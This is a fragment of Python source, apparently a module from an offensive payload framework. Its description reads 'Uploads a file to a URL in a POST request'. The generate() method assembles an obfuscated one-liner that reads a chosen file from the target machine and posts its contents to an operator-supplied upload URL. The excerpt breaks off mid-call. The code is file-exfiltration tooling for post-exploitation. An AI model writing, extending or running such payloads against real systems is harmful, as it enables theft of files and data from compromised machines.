from payloads.helpers.string import unique_random_string_set, random_string
...
class Module:
    ...
    def __init__(self, params=[]):
        ...
        self.info = {
            ...
            'Description': 'Uploads a file to a URL in a POST request',
        }
    ...
    def generate(self):
        ...
        code = "import os;"
        code += "{0}=open(os.path.expanduser({1}),'rb');".format(var_file,
                                                                 obfuscate_python_string(self.options['Path']['Value']))
        code += "{0}={1}.read();".format(var_post_data, var_file)
        code += "{0}.close();".format(var_file)

        code += urllib_callback(url=self.options['Upload URL']['Value'],
